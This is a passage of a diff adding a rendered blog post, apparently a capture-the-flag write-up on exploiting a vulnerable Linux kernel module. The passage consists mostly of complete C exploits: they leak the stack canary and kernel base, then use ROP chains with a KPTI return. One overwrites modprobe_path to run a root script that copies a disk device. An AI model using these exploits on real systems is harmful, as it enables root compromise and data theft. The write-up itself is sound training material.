+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] prepare_kernel_cred: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+        <span class="n">get_addr2</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_addr</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x150</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget2</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget3</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak1</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Never reach! try to read from kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] open ko, return %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x140</span><span class="p">];</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] try to read from kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x140</span><span class="p">));</span>
+        <span class="c1">// long long unsigned base = u64(buf + 0xd8) - 0x569977;
+</span><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x140</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
+        <span class="c1">//      printf(&#34;[0x%x] %llx \n&#34;, i, u64(buf + i));
+</span><span class="c1"></span>        <span class="p">}</span>
+        <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+        <span class="n">base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x130</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xa157</span><span class="p">;</span>
+        <span class="n">gadget1</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x6370</span><span class="p">;</span> <span class="c1">//  pop rdi; ret;
+</span><span class="c1"></span>        <span class="n">gadget2</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x4d11</span><span class="p">;</span> <span class="c1">//  pop rax; ret;
+</span><span class="c1"></span>        <span class="n">gadget3</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x4aad</span><span class="p">;</span> <span class="c1">//  mov rax, qword ptr [rax + 0x10]; pop rbp; ret;
+</span><span class="c1"></span>        <span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xf87d90</span><span class="p">;</span>
+        <span class="n">kpti_gadget</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x200f10</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">;</span>
+        <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xf8d4fc</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] kernel base is %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
+        <span class="n">init_tf_work</span><span class="p">();</span>
+        <span class="n">get_addr</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>But this does not end yet. When I was looking for sovles by other players, I found a really elegant method [3]. This technique is trigger call_modprobe() to execute the file which modprobe_path points to by trying to execve() an unrecognisable format file. And by overwriting modprobe_path which is also unaffected by fgkaslr, we can let our script be executed, which causes an arbitrary code execution with root privileges.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">call_modprobe</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">module_name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wait</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-q&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;--&#34;</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">module_name</span><span class="p">;</span>
+  	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  	<span class="n">info</span> <span class="o">=</span> <span class="n">call_usermodehelper_setup</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+					 <span class="nb">NULL</span><span class="p">,</span> <span class="n">free_modprobe_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Here is the exploit which works for me.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rax_ret</span><span class="p">;</span> <span class="c1">// pop rax; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rbx_r12_rbp_ret</span><span class="p">;</span> <span class="c1">// pop rbx ; pop r12 ; pop rbp ; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">write_ptr_rbx_rax_pop2_ret</span><span class="p">;</span> <span class="c1">// mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe_path</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">base</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">trap_frame</span><span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">rip</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">cs</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">rsp</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ss</span><span class="p">;</span>
+<span class="p">}</span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
+<span class="k">struct</span> <span class="n">trap_frame</span> <span class="n">tf</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">tf_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tf</span><span class="p">;</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">u64</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">s</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">7</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span><span class="mi">0</span> <span class="p">;</span><span class="n">i</span><span class="o">--</span><span class="p">){</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x00000000000000ff</span> <span class="o">&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">init_tf_work</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span> <span class="k">volatile</span><span class="p">(</span><span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tf+8, cs;&#34;</span>    <span class="c1">//set cs
+</span><span class="c1"></span>        <span class="s">&#34;pushf;pop tf+16;&#34;</span>       <span class="c1">//set eflags
+</span><span class="c1"></span>        <span class="s">&#34;push rsp;pop tf+24;&#34;</span>
+        <span class="s">&#34;mov tf+32, ss;&#34;</span><span class="p">);</span>
+    <span class="n">tf</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x100000</span><span class="p">;</span>
+    <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Returned to userland, setting up for fake modprobe&#34;</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">cp /dev/sda /tmp/flag</span><span class="se">\n</span><span class="s">chmod 777 /tmp/flag&#39; &gt; /tmp/x&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/x&#34;</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /tmp/dummy&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Run unknown file&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Hopefully flag is readable&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /tmp/flag&#34;</span><span class="p">);</span>
+
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x782f706d742f</span><span class="p">;</span> <span class="c1">// rax &lt;- &#34;/tmp/x&#34;
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rbx_r12_rbp_ret</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span> <span class="c1">// rbx &lt;- modprobe_path
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">write_ptr_rbx_rax_pop2_ret</span><span class="p">;</span> <span class="c1">// modprobe_path &lt;- &#34;/tmp/x&#34;
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_flag</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to overwrite modprobe_path&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+        <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] open ko, return %d </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">global_fd</span><span class="p">);</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x140</span><span class="p">];</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] try to read from kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x140</span><span class="p">));</span>
+        <span class="c1">// long long unsigned base = u64(buf + 0xd8) - 0x569977;
+</span><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mh">0x140</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
+        <span class="c1">//      printf(&#34;[0x%x] %llx \n&#34;, i, u64(buf + i));
+</span><span class="c1"></span>        <span class="p">}</span>
+        <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
+        <span class="n">base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x130</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xa157</span><span class="p">;</span>
+        <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x1061820</span><span class="p">;</span>
+        <span class="n">kpti_gadget</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x200f10</span> <span class="o">+</span> <span class="mh">0x16</span><span class="p">;</span>
+        <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x4d11UL</span><span class="p">;</span> <span class="c1">// pop rax; ret;
+</span><span class="c1"></span>        <span class="n">pop_rbx_r12_rbp_ret</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x3190UL</span><span class="p">;</span> <span class="c1">// pop rbx ; pop r12 ; pop rbp ; ret;
+</span><span class="c1"></span>        <span class="n">write_ptr_rbx_rax_pop2_ret</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x306dUL</span><span class="p">;</span> <span class="c1">// mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
+</span><span class="c1"></span>        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] kernel base is %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
+        <span class="n">init_tf_work</span><span class="p">();</span>
+        <span class="n">overflow</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Awesome!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
